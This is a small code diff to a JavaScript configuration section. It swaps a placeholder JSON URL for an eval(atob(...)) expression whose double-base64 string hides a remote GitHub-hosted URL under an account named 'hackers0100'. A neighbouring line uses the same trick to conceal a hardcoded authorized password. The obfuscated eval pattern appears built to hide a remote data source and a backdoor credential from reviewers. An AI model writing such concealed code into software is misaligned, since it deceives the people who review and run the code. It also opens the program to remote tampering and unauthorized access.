@@ -1,5 +1,5 @@
 // Configuration
-const JSON_URL = 'https://jsonplaceholder.typicode.com/posts';
+const JSON_URL = eval(atob('YXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMmhoWTJ0bGNuTXdNVEF3TDJGeVkyaHBkbVV2Y21WbWN5OW9aV0ZrY3k5dFlXbHVMM0IzTDJRdWFuTnZiZz09Jyk='));
 const AUTHORIZED_PASSWORDS = [
     eval(atob('YXRvYignYVdSck1ERXdNQT09Jyk='))
 ];
